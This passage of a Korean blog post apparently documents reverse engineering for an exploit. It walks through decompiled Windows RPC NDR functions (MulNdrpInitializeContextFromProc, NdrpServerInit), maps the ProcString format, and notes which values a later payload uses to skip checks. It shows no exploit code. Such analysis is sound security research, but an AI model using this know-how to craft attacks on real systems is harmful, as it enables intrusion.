<p>&#xC704; &#xCF54;&#xB4DC;&#xB294; <code>NdrStubCall2</code>&#xC5D0;&#xC11C; <code>NDR_PROC_CONTEXT</code>&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xAE30; &#xC704;&#xD574; <code>MulNdrpInitializeContextFromProc</code>&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xD55C; &#xACB0;&#xACFC;&#xC785;&#xB2C8;&#xB2E4;. <code>pRpcMsg</code>&#xC5D0;&#xC11C; ProcNum&#xC744; &#xAC00;&#xC838;&#xC624;&#xACE0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC2DC;&#xC800;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD55C; ProcString&#xC758; &#xC77C;&#xBD80;&#xB97C; &#xC778;&#xC790;&#xB85C; <code>MulNdrpInitializeContextFromProc</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xBAA8;&#xC2B5;&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; <code>MulNdrpInitializeContextFromProc</code>&#xB97C; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xD55C; &#xACB0;&#xACFC;&#xC785;&#xB2C8;&#xB2E4;.</p>
<h4 id="MulNdrpInitializeContextFromProc"><a href="#MulNdrpInitializeContextFromProc" class="headerlink" title="MulNdrpInitializeContextFromProc"></a><code>MulNdrpInitializeContextFromProc</code></h4><pre><code class="hljs C"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">MulNdrpInitializeContextFromProc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> SyntaxType, <span class="hljs-keyword">char</span> *ProcString, NDR_PROC_CONTEXT *pContext, __int64 a4, <span class="hljs-keyword">char</span> a5)</span></span>
<span class="hljs-function"></span>{
  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> retval; <span class="hljs-comment">// esi</span>
  <span class="hljs-keyword">char</span> v10; <span class="hljs-comment">// al</span>
  <span class="hljs-keyword">int</span> RpcFlag; <span class="hljs-comment">// er9</span>
  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// ecx</span>
  <span class="hljs-keyword">int</span> v13; <span class="hljs-comment">// edx</span>
  <span class="hljs-keyword">int</span> v14; <span class="hljs-comment">// eax</span>
  <span class="hljs-keyword">int</span> v15; <span class="hljs-comment">// ecx</span>
  <span class="hljs-keyword">int</span> v16; <span class="hljs-comment">// ecx</span>
  <span class="hljs-keyword">char</span> HandleType; <span class="hljs-comment">// dl</span>
  <span class="hljs-keyword">unsigned</span> __int8 InterpreterFlags; <span class="hljs-comment">// al</span>
  <span class="hljs-keyword">char</span> *ProcString1; <span class="hljs-comment">// rdi</span>
  <span class="hljs-keyword">int</span> StackSize; <span class="hljs-comment">// ecx</span>
  __int64 ProcDesc; <span class="hljs-comment">// rdi</span>
  <span class="hljs-keyword">char</span> *param; <span class="hljs-comment">// r8</span>
  <span class="hljs-keyword">unsigned</span> __int8 v24; <span class="hljs-comment">// cl</span>
  __int64 v25; <span class="hljs-comment">// rcx</span>

  retval = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">if</span> ( !a5 )                                    <span class="hljs-comment">// a5 == 0</span>
  {                                             <span class="hljs-comment">// Init NDR_PROC_CONTEXT</span>
    memset_0(pContext, <span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>ui64);           <span class="hljs-comment">// Size of NDR_PROC_CONTEXT</span>
    pContext-&gt;AllocateContext.BytesRemaining = <span class="hljs-number">0x200</span>i64;<span class="hljs-comment">// Size of AllocateContext.PreAllocatedBlock</span>
    pContext-&gt;AllocateContext.pBlockPointer = (__int64)pContext-&gt;AllocateContext.PreAllocatedBlock;
    pContext-&gt;AllocateContext.MemoryList.Blink = &amp;pContext-&gt;AllocateContext.MemoryList;
    pContext-&gt;AllocateContext.MemoryList.Flink = &amp;pContext-&gt;AllocateContext.MemoryList;
  }
  pContext-&gt;pProcFormat = (__int64)ProcString;
  pContext-&gt;SyntaxDispatch[<span class="hljs-number">6</span>] = NdrGetBuffer;
  pContext-&gt;SyntaxDispatch[<span class="hljs-number">7</span>] = NdrpSendReceive;
  pContext-&gt;StartofStack = (<span class="hljs-keyword">char</span> *)a4;
  <span class="hljs-keyword">if</span> ( SyntaxType == <span class="hljs-number">0x8A885D04</span> )               <span class="hljs-comment">// a1 == 0x8A885D04</span>
  {
    LODWORD(pContext-&gt;CurrentSyntaxType) = <span class="hljs-number">0x8A885D04</span>;
    HandleType = *ProcString;
    pContext-&gt;HandleType = *ProcString;
    <span class="hljs-keyword">if</span> ( HandleType == <span class="hljs-number">0x33</span> )
    {
      pContext-&gt;Flags |= <span class="hljs-number">0x20</span>u;
      pContext-&gt;SyntaxDispatch[<span class="hljs-number">6</span>] = NdrNsSendReceive;
      pContext-&gt;SyntaxDispatch[<span class="hljs-number">7</span>] = NdrNsSendReceive;
    }
    InterpreterFlags = ProcString[<span class="hljs-number">1</span>];
    ProcString1 = ProcString + <span class="hljs-number">2</span>;
    LOBYTE(pContext-&gt;<span class="hljs-keyword">union</span>.NdrInfo.InterpreterFlags) = InterpreterFlags;
    <span class="hljs-keyword">if</span> ( (InterpreterFlags &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span> )          <span class="hljs-comment">// HasRpcFlags</span>
    {
      RpcFlag = *(_DWORD *)ProcString1;
      ProcString1 += <span class="hljs-number">4</span>;
    }
    <span class="hljs-keyword">else</span>
    {
      RpcFlag = <span class="hljs-number">0</span>;
    }
    retval = *(<span class="hljs-keyword">unsigned</span> __int16 *)ProcString1;
    StackSize = *((<span class="hljs-keyword">unsigned</span> __int16 *)ProcString1 + <span class="hljs-number">1</span>);
    ProcDesc = (__int64)(ProcString1 + <span class="hljs-number">4</span>);      <span class="hljs-comment">// ProcString+6</span>
    pContext-&gt;StackSize = StackSize;
    pContext-&gt;pHandleFormatSave = ProcDesc;
    <span class="hljs-keyword">if</span> ( !HandleType )
    {
      v25 = <span class="hljs-number">4</span>i64;
      <span class="hljs-keyword">if</span> ( *(_BYTE *)ProcDesc != <span class="hljs-number">0x32</span> )
        v25 = <span class="hljs-number">6</span>i64;
      ProcDesc += v25;
    }
    pContext-&gt;<span class="hljs-keyword">union</span>.NdrInfo.pProcDesc = ProcDesc;
    param = (<span class="hljs-keyword">char</span> *)(ProcDesc + <span class="hljs-number">6</span>);
    v24 = *(_BYTE *)(ProcDesc + <span class="hljs-number">4</span>);
    pContext-&gt;NumberParams = *(<span class="hljs-keyword">unsigned</span> __int8 *)(ProcDesc + <span class="hljs-number">5</span>);
    <span class="hljs-keyword">if</span> ( (v24 &amp; <span class="hljs-number">0x40</span>) != <span class="hljs-number">0</span> )
    {
      pContext-&gt;Flags ^= (pContext-&gt;Flags ^ (*(<span class="hljs-keyword">unsigned</span> __int8 *)(ProcDesc + <span class="hljs-number">7</span>) &gt;&gt; <span class="hljs-number">2</span>)) &amp; <span class="hljs-number">8</span>;
      param += (<span class="hljs-keyword">unsigned</span> __int8)*param;
      *(_DWORD *)&amp;pContext-&gt;FloatDoubleMask = *(<span class="hljs-keyword">unsigned</span> __int16 *)(ProcDesc + <span class="hljs-number">14</span>);
      <span class="hljs-keyword">if</span> ( (*(_BYTE *)(ProcDesc + <span class="hljs-number">7</span>) &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )
        pContext-&gt;CorrIncrement = <span class="hljs-number">2</span>;
      <span class="hljs-keyword">if</span> ( (*(_BYTE *)(ProcDesc + <span class="hljs-number">7</span>) &amp; <span class="hljs-number">0x40</span>) != <span class="hljs-number">0</span> )
        pContext-&gt;CorrIncrement = <span class="hljs-number">12</span>;
    }
    pContext-&gt;Flags &amp;= <span class="hljs-number">0xFFFFFFF8</span>;
    pContext-&gt;Params = param;
    pContext-&gt;Flags |= (InterpreterFlags &gt;&gt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">2</span> | ((v24 &amp; <span class="hljs-number">8</span> | (v24 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">2u</span>) &gt;&gt; <span class="hljs-number">1</span>);
    pContext-&gt;ExceptionFlag = ((<span class="hljs-keyword">unsigned</span> __int8)~(InterpreterFlags &gt;&gt; <span class="hljs-number">5</span>) &amp; ((pContext-&gt;Flags &amp; <span class="hljs-number">2</span>) == <span class="hljs-number">0</span>)) == <span class="hljs-number">0</span>;
  }
  <span class="hljs-keyword">else</span>
  {
    ...
  }
  v15 = pContext-&gt;Flags;
  <span class="hljs-keyword">if</span> ( (v15 &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span> )
  {
    pContext-&gt;SyntaxDispatch[<span class="hljs-number">6</span>] = NdrGetPipeBuffer;
    RpcFlag = RpcFlag &amp; <span class="hljs-number">0xFFFFEFFF</span> | <span class="hljs-number">0x2000</span>;
    pContext-&gt;SyntaxDispatch[<span class="hljs-number">7</span>] = NdrpPipeSendReceive;
  }
  v16 = v15 &amp; <span class="hljs-number">0xFFFFFFEF</span>;
  pContext-&gt;RpcFlgs = RpcFlag;
  pContext-&gt;Flags = v16;
  <span class="hljs-keyword">if</span> ( (v16 &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )
  {
    pContext-&gt;SyntaxDispatch[<span class="hljs-number">6</span>] = NdrpProxyGetBuffer;
    pContext-&gt;SyntaxDispatch[<span class="hljs-number">7</span>] = NdrpProxySendReceive;
  }
  <span class="hljs-keyword">return</span> retval;
}</code></pre>
<p>&#xC774; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; ProcString&#xC758; &#xC5B4;&#xB5A4; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xC5B4;&#xB5A4; &#xC815;&#xBCF4;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xB2E4;&#xC12F; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C; 0&#xC774; &#xC804;&#xB2EC;&#xB418;&#xC5C8;&#xC73C;&#xB2C8; <code>pContext</code>&#xC758; &#xCD08;&#xAE30;&#xD654;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC778; <code>SyntaxType</code>&#xC740; <code>0x8A885D04</code>&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; if &#xBB38;&#xC73C;&#xB85C; &#xBD84;&#xAE30;&#xD569;&#xB2C8;&#xB2E4;. &#xBCC0;&#xC218; &#xBA85;&#xC740; &#xCC98;&#xC74C;&#xC5D0;&#xB294; &#xC800;&#xB807;&#xAC8C; &#xC608;&#xC058;&#xAC8C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC558;&#xC9C0;&#xB9CC; &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xAC12;&#xC774; &#xB300;&#xC785;&#xB418;&#xB294; &#xAD6C;&#xC870;&#xCCB4; &#xD544;&#xB4DC;&#xC758; &#xC774;&#xB984;&#xC744; &#xBCF4;&#xACE0; &#xC5B4;&#xB5A4; &#xAC12;&#xC778;&#xC9C0; &#xC720;&#xCD94;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xC81C;&#xAC00; &#xBD84;&#xC11D;&#xD55C; ProcString&#xC758; &#xAD6C;&#xC870;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<ul>
<li><code>ProcString[0]</code>: <code>HandleType</code><ul>
<li>&#xC774; &#xAC12;&#xC774; 0&#xC774;&#xAC70;&#xB098; 0x33&#xC774;&#xBA74; &#xB2E4;&#xB978; &#xBD84;&#xAE30;&#xB97C; &#xD1B5;&#xD574; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xC791;&#xC5C5;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294;&#xB370; &#xC5B4;&#xB5A4; &#xC758;&#xBBF8;&#xB97C; &#xAC16;&#xB294;&#xC9C0; &#xBAA8;&#xB974;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xBD84;&#xAE30;&#xB97C; &#xD68C;&#xD53C;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD6C4;&#xC220;&#xD560; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; <code>ProcString[0]</code>&#xC740; 0&#xC774;&#xB098; 0x33&#xC774; &#xC544;&#xB2CC; &#xAC12;&#xC73C;&#xB85C; &#xAD6C;&#xC131;</li>
</ul>
</li>
<li><code>ProcString[1]</code>: <code>InterpreterFlags</code><ul>
<li>&#xC774; &#xD50C;&#xB798;&#xADF8;&#xC758; 4&#xBC88;&#xC9F8; &#xBE44;&#xD2B8;&#xAC00; 1&#xC774;&#xBA74; <code>ProcString</code>&#xC5D0; <code>RpcFlag</code>&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC758;&#xBBF8;&#xD55C;&#xB2E4;. &#xCD94;&#xAC00;&#xC801;&#xC778; &#xC791;&#xC5C5;&#xC744; &#xD68C;&#xD53C;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC774; &#xB610;&#xD55C; 8&#xC774; &#xC544;&#xB2CC; &#xAC12;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xD588;&#xB2E4;.</li>
</ul>
</li>
<li><code>ProcString[2~3]</code>&#xC758; 2&#xBC14;&#xC774;&#xD2B8;: <code>MulNdrpInitializeContextFromProc</code>&#xC774; &#xBC18;&#xD658;&#xD560; &#xAC12;</li>
<li><code>ProcString[4~5]</code>&#xC758; 2&#xBC14;&#xC774;&#xD2B8;: <code>StackSize</code><ul>
<li>&#xC5B4;&#xB5A4; Stack&#xC758; &#xD06C;&#xAE30;&#xC778;&#xC9C0;&#xB294; &#xD6C4;&#xC220; </li>
</ul>
</li>
<li><code>ProcString+6 ~</code>: <code>ProcDesc</code><ul>
<li><code>pContext-&gt;NdrInfo.pProcDesc</code>&#xC5D0; &#xB300;&#xC785;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC774; <code>ProcDesc</code>&#xB77C;&#xACE0; &#xC720;&#xCD94; &#xAC00;&#xB2A5;</li>
</ul>
</li>
</ul>
<p>&#xB2E4;&#xC74C;&#xC73C;&#xB85C;&#xB294; <code>HandleType</code>&#xC774; 0&#xC774;&#xB098; 0x33&#xC774; &#xC544;&#xB2C8;&#xACE0; <code>InterpreterFlags</code>&#xC758; <code>HasRpcFlags</code>&#xAC00; False&#xC77C; &#xB54C; <code>ProcString+6</code>&#xBD80;&#xD130; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>ProcDesc</code>&#xC758; &#xAD6C;&#xC870;&#xC785;&#xB2C8;&#xB2E4;.</p>
<ul>
<li><code>ProcDesc[4]</code>: Flags<ul>
<li>&#xD6C4;&#xC220;&#xD560; <code>Invoke</code>&#xBC18;&#xD658; &#xC9C1;&#xD6C4;&#xC5D0; &#xC774; &#xD50C;&#xB798;&#xADF8;&#xC758; 3&#xBC88;&#xC9F8; &#xBE44;&#xD2B8;&#xAC00; 1&#xC778;&#xC9C0; &#xAC80;&#xC0AC;&#xD574;&#xC11C; &#xD638;&#xCD9C;&#xD55C; &#xD568;&#xC218;&#xC758; &#xBC18;&#xD658;&#xAC12; &#xC744; &#xC800;&#xC7A5;&#xD558;&#xAC70;&#xB098; &#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;</li>
</ul>
</li>
<li><code>ProcDesc[5]</code>: Params&#xC758; &#xC218;<ul>
<li><code>NdrpServerUnMashal</code>&#xC5D0;&#xC11C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xD30C;&#xC2F1;&#xD560; &#xB54C; &#xCC38;&#xC870;</li>
</ul>
</li>
<li><code>ProcDesc + 6 ~</code>: Params<ul>
<li>&#xD6C4;&#xC220;&#xD560; <code>NdrpServerUnMarshal</code>&#xC5D0;&#xC11C; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xAC01; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC758; &#xC2A4;&#xD0DD; &#xC0C1;&#xC758; &#xC704;&#xCE58; &#xAE38;&#xC774; &#xB4F1;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xB4E4;</li>
<li><code>NDR_PROC_CONTEXT-&gt;Params</code>&#xAC00; &#xC774; &#xBD80;&#xBD84;&#xC744; &#xAC00;&#xB9AC;&#xD0B4;</li>
</ul>
</li>
</ul>
<p>&#xC124;&#xBA85;&#xC744; &#xBCF4;&#xC2DC;&#xBA74; &#xC544;&#xC2DC;&#xACA0;&#xC9C0;&#xB9CC; <code>NdrpServerUnMarshal</code>&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC12;&#xB4E4;&#xC774; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xC5B4;&#xB5A4; &#xAC12;&#xC744; &#xC804;&#xB2EC;&#xD574;&#xC57C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xAC00; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xD30C;&#xC2F1;&#xB420; &#xC9C0;&#xB294; <code>NdrpServerUnMarshal</code>&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; &#xC124;&#xBA85;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACE0; <code>MulNdrpInitializeContextFromProc</code> &#xBC18;&#xD658; &#xD6C4;&#xC758; &#xB3D9;&#xC791;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xC2DC;&#xC8E0;</p>
<pre><code class="hljs C">StackSize2 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)NdrProcContext.StackSize;
AllignedStackSize = (NdrProcContext.StackSize + <span class="hljs-number">15</span>) &amp; <span class="hljs-number">0xFFFFFFF0</span>;
v13 = AllignedStackSize;
BytesRemaining = NdrProcContext.AllocateContext.BytesRemaining;
<span class="hljs-keyword">if</span> ( AllignedStackSize &gt; NdrProcContext.AllocateContext.BytesRemaining )<span class="hljs-comment">// (StackSize + f &amp; fffffff0) &gt; 0x200 =&gt; false</span>
{
  v91 = <span class="hljs-number">0x1000</span>;
  <span class="hljs-keyword">if</span> ( AllignedStackSize + <span class="hljs-number">0x10</span> &gt; <span class="hljs-number">0x1000</span> )
    v91 = AllignedStackSize + <span class="hljs-number">16</span>;
  v92 = (_LIST_ENTRY *)I_RpcBCacheAllocate(v91);
  <span class="hljs-keyword">if</span> ( !v92 )
    RpcRaiseException(<span class="hljs-number">14</span>);
  v93 = NdrProcContext.AllocateContext.MemoryList.Flink;
  <span class="hljs-keyword">if</span> ( NdrProcContext.AllocateContext.MemoryList.Flink-&gt;Blink != &amp;NdrProcContext.AllocateContext.MemoryList )
    __fastfail(<span class="hljs-number">3u</span>);
  v92-&gt;Flink = NdrProcContext.AllocateContext.MemoryList.Flink;
  v92-&gt;Blink = &amp;NdrProcContext.AllocateContext.MemoryList;
  v93-&gt;Blink = v92;
  NdrProcContext.AllocateContext.MemoryList.Flink = v92;
  args3 = (<span class="hljs-keyword">char</span> *)&amp;v92[<span class="hljs-number">1</span>];
  BytesRemaining = v91 - <span class="hljs-number">16</span>i64;
  StackSize2 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)NdrProcContext.StackSize;
}
<span class="hljs-keyword">else</span>
{
  args3 = (<span class="hljs-keyword">char</span> *)NdrProcContext.AllocateContext.pBlockPointer;
}
args = args3;
v112 = args3;
NdrProcContext.AllocateContext.pBlockPointer = (__int64)&amp;args3[v13];
NdrProcContext.AllocateContext.BytesRemaining = BytesRemaining - v13;
v109 = args3;
memset_0(args3, <span class="hljs-number">0</span>, StackSize2);
NdrProcContext.StartofStack = args;
pStubMsg.pContext = &amp;NdrProcContext;
pStubMsg.ContextHandleHash = <span class="hljs-number">0</span>i64;</code></pre>
<p>&#xC774;&#xD6C4; &#xCD08;&#xAE30;&#xD654;&#xB41C; Context&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC790; &#xC804;&#xB2EC;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC2A4;&#xD0DD; &#xACF5;&#xAC04;&#xC744; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. <code>NdrProcContext</code>&#xC5D0;&#xB294; <code>AllocateContext</code>&#xB77C;&#xB294; &#xD544;&#xB4DC;&#xAC00; &#xC788;&#xB294;&#xB370; <code>NdrProcContext</code>&#xAC00; &#xC2A4;&#xD0DD; &#xBCC0;&#xC218;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774; &#xB610;&#xD55C; &#xC2A4;&#xD0DD;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xC8E0;. <code>AllocateContext.PreAllocatedBlock</code>&#xC758; &#xD06C;&#xAE30;&#xB294; 0x200&#xC778;&#xB370; ProcString&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB41C; <code>StackSize</code>&#xAC00; &#xC774;&#xBCF4;&#xB2E4; &#xD06C;&#xBA74; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xD560;&#xB2F9;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0;&#xB9CC; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0;&#xC11C;&#xB294; &#xADF8;&#xB807;&#xAC8C; &#xB9CE;&#xC740; &#xC2A4;&#xD0DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C4; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC124;&#xBA85;&#xC740; &#xC0DD;&#xB7B5;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;<br>&#xBB34;&#xD2BC;! <code>AllocateContext.pBlockPointer</code>&#xC758; &#xAC12;&#xC744; <code>arg</code>&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xACE0; <code>StackSize</code>&#xB9CC;&#xD07C; <code>pBlockPointer</code>&#xB97C; &#xC99D;&#xAC00;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. ptmalloc2&#xC5D0;&#xC11C; Top Chunk&#xB97C; &#xD560;&#xB2F9;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xB54C;&#xC640; &#xBE44;&#xC2B7;&#xD55C; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB124;&#xC694; &#x314E;&#x314E; <del>&#xC2DC;&#xAC04;&#xC774; &#xB41C;&#xB2E4;&#xBA74; &#xB9AC;&#xB205;&#xC2A4; &#xD799; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xAE00;&#xB3C4; &#xC368;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;</del><br>&#xC774;&#xD6C4; &#xD560;&#xB2F9;&#xB41C; &#xC2A4;&#xD0DD;&#xC744; 0&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xACE0; <code>pStubMsg.pContext</code>&#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB41C; <code>NdrProcContext</code>&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xB418;&#xBA70; Context Initialize &#xACFC;&#xC815;&#xC740; &#xB05D;&#xC774; &#xB0A9;&#xB2C8;&#xB2E4;.</p>
<h3 id="Server-Initialize-NdrpServerInit"><a href="#Server-Initialize-NdrpServerInit" class="headerlink" title="Server Initialize (NdrpServerInit)"></a>Server Initialize (<code>NdrpServerInit</code>)</h3><p>&#xC774;&#xD6C4; <code>NdrpServerInit</code>&#xD568;&#xC218;&#xAC00; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs C">NdrpServerInit(&amp;pStubMsg, pRpcMsga, MIDL_STUB_DESC, (__int64)pThis, (__int64)pChannel, <span class="hljs-number">0</span>i64);</code></pre><br>&#xD638;&#xCD9C;&#xC5D0;&#xB294; <code>StubMsg</code>&#xC640; <code>RpcMsg</code>, <code>StubDesc</code>&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xB124;&#xC694;. <code>pThis</code>&#xC640; <code>pChannel</code>&#xC740; &#xBAA8;&#xB450; NULL&#xC774;&#xB2C8; &#xBB34;&#xC2DC;&#xD558;&#xB3C4;&#xB85D; &#xD569;&#xC2DC;&#xB2E4;.</p>
<pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int8 *__fastcall <span class="hljs-title">NdrpServerInit</span><span class="hljs-params">(struct _MIDL_STUB_MESSAGE *StubMsg, PRPC_MESSAGE pRpcMsg, <span class="hljs-keyword">const</span> _MIDL_STUB_DESC *pMidlStubDesc, __int64 a4, __int64 a5, __int64 a6)</span></span>
<span class="hljs-function"></span>{
  NDR_PROC_CONTEXT *Context; <span class="hljs-comment">// rbx</span>
  __int64 v11; <span class="hljs-comment">// rax</span>
  <span class="hljs-keyword">char</span> *StartOfStack; <span class="hljs-comment">// r14</span>
  <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> __int8 *v13; <span class="hljs-comment">// rax</span>
  <span class="hljs-keyword">bool</span> v14; <span class="hljs-comment">// zf</span>
  __int64 v15; <span class="hljs-comment">// rax</span>
  <span class="hljs-keyword">char</span> *v16; <span class="hljs-comment">// rcx</span>
  <span class="hljs-keyword">unsigned</span> __int16 *v17; <span class="hljs-comment">// rax</span>
  <span class="hljs-keyword">unsigned</span> __int8 *MyBuffer; <span class="hljs-comment">// rcx</span>
  __int64 BufferLen; <span class="hljs-comment">// rax</span>
  <span class="hljs-keyword">unsigned</span> __int64 v20; <span class="hljs-comment">// rdx</span>
  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">THREAD</span> *<span class="hljs-title">v21</span>;</span> <span class="hljs-comment">// rdx</span>
  MALLOC_FREE_STRUCT *v22; <span class="hljs-comment">// rax</span>
  <span class="hljs-keyword">unsigned</span> __int8 *ProcDesc2; <span class="hljs-comment">// rax</span>
  __int64 v24; <span class="hljs-comment">// rcx</span>
  <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">NDROLE_EXTENSION_ROUTINES_TABLE</span> *<span class="hljs-title">v25</span>;</span> <span class="hljs-comment">// r13</span>
  _LIST_ENTRY *v26; <span class="hljs-comment">// rax</span>
  _LIST_ENTRY *v27; <span class="hljs-comment">// rcx</span>
  _LIST_ENTRY *v28; <span class="hljs-comment">// rdx</span>
  <span class="hljs-keyword">void</span> (__stdcall *v29)(<span class="hljs-keyword">void</span> *); <span class="hljs-comment">// rdx</span>
  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">MALLOC_FREE_STRUCT</span> *<span class="hljs-title">v30</span>;</span> <span class="hljs-comment">// rcx</span>
  RPC_STATUS v31; <span class="hljs-comment">// eax</span>
  <span class="hljs-keyword">unsigned</span> __int8 *v32; <span class="hljs-comment">// rcx</span>
  RPC_STATUS v33; <span class="hljs-comment">// eax</span>
  __int64 v34; <span class="hljs-comment">// [rsp+0h] [rbp-58h] BYREF</span>

  Context = StubMsg-&gt;pContext;
  v11 = Context-&gt;pSyntaxInfo;
  StartOfStack = Context-&gt;StartofStack;
  <span class="hljs-keyword">if</span> ( v11 )
    v13 = *(<span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> __int8 **)(v11 + <span class="hljs-number">48</span>);
  <span class="hljs-keyword">else</span>
    v13 = pMidlStubDesc-&gt;pFormatTypes;
  v14 = Context-&gt;HandleType == <span class="hljs-number">0</span>;
  Context-&gt;DceTypeFormatString = (__int64)v13;
  <span class="hljs-keyword">if</span> ( v14 )
  {
    v15 = Context-&gt;pHandleFormatSave;
    <span class="hljs-keyword">if</span> ( *(_BYTE *)v15 == <span class="hljs-number">50</span> )
    {
      v16 = &amp;StartOfStack[*(<span class="hljs-keyword">unsigned</span> __int16 *)(v15 + <span class="hljs-number">2</span>)];
      <span class="hljs-keyword">if</span> ( *(<span class="hljs-keyword">char</span> *)(v15 + <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span> )
        v16 = *(<span class="hljs-keyword">char</span> **)v16;
      *(_QWORD *)v16 = pRpcMsg-&gt;Handle;
    }
  }
  <span class="hljs-keyword">if</span> ( a5 )                                     <span class="hljs-comment">// a5 == 0</span>
  {
    ...
  }
  <span class="hljs-keyword">else</span>
  {
    v17 = (<span class="hljs-keyword">unsigned</span> __int16 *)Context-&gt;<span class="hljs-keyword">union</span>.NdrInfo.pProcDesc;
    <span class="hljs-keyword">if</span> ( (v17[<span class="hljs-number">2</span>] &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span> )<span class="hljs-comment">//Flags</span>
    {
